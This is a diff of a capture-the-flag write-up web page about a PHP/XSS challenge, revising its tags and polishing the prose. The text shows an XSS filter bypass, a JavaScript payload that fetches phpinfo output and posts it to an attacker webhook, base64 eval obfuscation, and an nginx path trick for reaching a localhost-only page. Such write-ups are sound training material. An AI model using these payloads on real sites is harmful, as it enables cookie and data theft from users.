@@ -28,12 +28,12 @@ Source # filename: index.py &lt;?">
   <meta property="og:type" content="article">
     <meta property="article:section" content="writeups">
     <meta property="article:published_time" content="2024-08-18T12:58:59+02:00">
-    <meta property="article:modified_time" content="2024-08-18T12:58:59+02:00">
+    <meta property="article:modified_time" content="2024-08-19T09:28:03+02:00">
     <meta property="article:tag" content="Web">
     <meta property="article:tag" content="Php">
-    <meta property="article:tag" content="Xss">
-    <meta property="article:tag" content="140 Points">
-    <meta property="article:tag" content="141 Solves">
+    <meta property="article:tag" content="XSS">
+    <meta property="article:tag" content="133 Points">
+    <meta property="article:tag" content="165 Solves">
     <meta property="article:tag" content="Abdelhameed Ghazy">
 
     
@@ -249,16 +249,16 @@ Source # filename: index.py &lt;?">
     <div class="badge">Web</div>
 
   
-    <div class="badge">Php</div>
+    <div class="badge">php</div>
 
   
-    <div class="badge">Xss</div>
+    <div class="badge">XSS</div>
 
   
-    <div class="badge">140 points</div>
+    <div class="badge">133 points</div>
 
   
-    <div class="badge">141 solves</div>
+    <div class="badge">165 solves</div>
 
   
     <div class="badge">Abdelhameed Ghazy</div>
@@ -411,26 +411,26 @@ default_type application/octet-stream;
   </a>
 </h2>
 
-<p>This challange is very nice in my opinion neither too difficult nor too complex, it mixes different vulnerabilities in a really nice way&hellip;</p>
-<p>The first one is designed to catch the cookie because in the configuration of bot.js we see that the cookie is set to httpOnly which makes the extraction much more difficult but looking a little online we understand why it is present that info.php in fact the function phpinfo() as well as show several parameters of the php configuration and other information also shows the cookies present at that time &hellip; SO HERE&rsquo;S THE TARGET AND GET THE OWN BOT TO OPEN /info.php</p>
+<p>This challenge is very nice in my opinion, neither too difficult nor too complex, it mixes different vulnerabilities in a really nice way&hellip;</p>
+<p>The first one is designed to catch the cookie, because in the configuration of bot.js we see that the cookie is set to httpOnly, which makes the extraction much more difficult, but looking a little online we understand why it is present, that info.php in fact the function phpinfo() as well as showing several parameters of the php configuration and other information also shows the cookies present at that time&hellip; SO THAT&rsquo;S THE OBJECTIVE, to get your own bot to open /info.php.</p>
 <p>But how can we do this?</p>
-<p>The first step is to be able to inject a payload that opens info.php and sends the file somewhere</p>
-<p>The only entrypoint we see is <code>?name=</code> which is not sanitized in the best way, in fact by making <code>&lt;h1&gt;BTC</code> (we make sure that the tag closes itself otherwise the final / will filter out) we notice that the h1 is rendered and this is &rsquo; a first sign that we can do an xss even if we note that the classic <code>&lt;script&gt;alert('ByteTheCookies')</code> doesn&rsquo;t work, probably some php configuration or some police, so the xss would be slightly more complex but we can exploit the onerror parameter of img with some changes in fact if we insert a classic <code>&lt;img src='invalid.jpg' onerror=&quot;alert('ByteTheCookies')&quot;</code> It will be sanitized by removing the spaces and will not allow the xss to be executed. But we can bypass this very easily, in fact by looking for some bypasses on HackTricks and trying some of them we notice that the payload <code>&lt;img%0Csrc=&quot;invalid.jpg&quot;onerror=&quot;alert('ByteTheCookies')&quot;</code> works</p>
+<p>The first step is to be able to inject a payload that opens info.php and sends the file somewhere.</p>
+<p>The only entry point we see is <code>? name='</code>, which is not sanitised in the best way, in fact by doing <code>&lt;h1&gt;BTC</code> (we make sure that the tag closes itself, otherwise the final / will be filtered out) we notice that the h1 is rendered and this is a first sign that we can do an xss, although we notice that the classic <code>&lt;script&gt;alert('ByteTheCookies')</code> doesn&rsquo;t work, Probably some php configuration or some police, so the xss would be a bit more complex, but we can use the <code>onerror</code> parameter of tag img with some modifications, in fact, if we insert a classic <code>&lt;img src='invalid. jpg' onerror=&quot;alert('ByteTheCookies')&quot;</code>, it will be sanitised by removing the spaces and will not allow the xss to run. But we can work around this very easily, in fact by looking for some workarounds on HackTricks and trying some of them, we find that the payload <code>&lt;img%0Csrc=&quot;invalid.jpg&quot;onerror=&quot;alert('ByteTheCookies')&quot;</code> works.</p>
 <p>GOOD we managed to bypass the xss now we have to create the payload we need&hellip;</p>
-<p>In particular I used: <code>fetch('{target}').then(r=&gt;r.text()).then(t=&gt;{fetch('{url_webhook}',{method:'POST',body:(f=new FormData(),f.append('file',new Blob([t],{type:'text/plain'}),'phpinfo.txt'),f)});console.log('Data sended');});</code></p>
-<p>This payload makes a first request and sends the content to a webhook in the form of a file so it&rsquo;s all very simple</p>
-<p>However, the problem arises in fact if this payload is sent it will not work because the URLs contain / which will be removed and this is a significant problem</p>
-<p>To bypass this, however, we can use a very simple trick, We just need to previously encode the payload in base64 and use an <code>eval(atob(payload))</code></p>
-<p>By sending this in the url we can make the payload work without problems. FINISHED RIGHT?</p>
-<p>No, because analyzing the nginx configuration we notice a significant detail</p>
+<p>Specifically, I used: <code>fetch('{target}').then(r=&gt;r.text()).then(t=&gt;{fetch('{url_webhook}',{method:'POST',body:(f=new FormData(),f.append('file',new Blob([t],{type:'text/plain'}),'phpinfo.txt'),f)});console.log('Data sended');});</code></p>
+<p>This payload makes an initial request and sends the content to a webhook in the form of a file, so it&rsquo;s all very simple.</p>
+<p>However, the problem is that when this payload is sent, it will not work because the URLs contain / which will be removed and this is a significant problem.</p>
+<p>However, to get around this we can use a very simple trick, we just need to encode the payload in base64 beforehand and use an <code>eval(atob(payload))</code>.</p>
+<p>By sending this in the URL, we can make the payload work without any problems. DONE, RIGHT?</p>
+<p>No, because analysing the nginx configuration we notice an important detail</p>
 <pre  class="mc-prism hide language-text" ><code class="language-ngix">location = /info.php {
         allow 127.0.0.1;
         deny all;
         }
 </code></pre>
-<p>As we see /info.php can only be reached from localhost and spoiler our bot is not on the same server as the challenge</p>
-<p>This may seem like a major obstacle but in reality by searching the internet for ngix bypasses we can find something very <a href="https://book.hacktricks.xyz/pentesting-web/proxy-waf-protections-bypass#php-fpm">interesting</a></p>
-<p>As we see on hacktricks we notice that if we insert an accessible page immediately after a non-accessible page in the ngix url it redirects us correctly to the non-accessible page and this is exactly what we need</p>
+<p>As we can see, /info.php is only accessible from localhost, and spoiler, our bot is not on the same server as the challenge.</p>
+<p>This may seem like a big obstacle, but in reality, if we search the web for ngix workarounds, we can find something very <a href="https://book.hacktricks.xyz/pentesting-web/proxy-waf-protections-bypass#php-fpm">interesting</a>.</p>
+<p>As we can see on Hacktricks, if we insert an accessible page immediately after a non-accessible page in the ngix URL, it will redirect us correctly to the non-accessible page, which is exactly what we need.</p>
 <p>So the final solution becomes:</p>
 <pre  class="mc-prism hide language-text" ><code class="language-python"># filename: exploit.py
 
